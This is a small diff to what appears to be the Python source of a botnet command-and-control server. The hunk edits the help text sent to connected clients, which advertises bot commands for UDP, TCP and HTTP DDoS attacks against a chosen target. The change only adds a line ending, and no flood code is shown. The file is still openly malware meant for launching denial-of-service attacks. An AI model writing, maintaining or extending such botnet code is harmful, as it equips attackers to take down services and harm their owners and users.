@@ -94,7 +94,7 @@ def clientThread(conn):
 					conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
 					conn.sendall("\r\n")
 					conn.sendall("[>] Bot Commands [<]\r\n")
-					conn.sendall("[!] Warning! These commands are built into the client made by Law not the server")
+					conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
 					conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
 					conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
 					conn.sendall("[?] >http [Target(without http://)] [Threads] - HTTP DDoS Attack\r\n")
